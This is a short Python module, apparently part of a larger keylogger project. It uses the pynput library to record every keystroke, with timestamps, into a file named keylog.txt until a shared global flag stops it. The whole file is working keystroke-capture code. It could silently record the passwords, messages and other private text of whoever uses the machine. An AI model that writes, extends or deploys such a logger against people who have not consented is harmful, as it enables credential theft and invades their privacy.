import globals
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 

def on_press(key):
    if globals.end_thread == False:
        logging.info(str(key))


def start_listener():
    listener = Listener(on_press=on_press)
    listener.start()
    listener.join()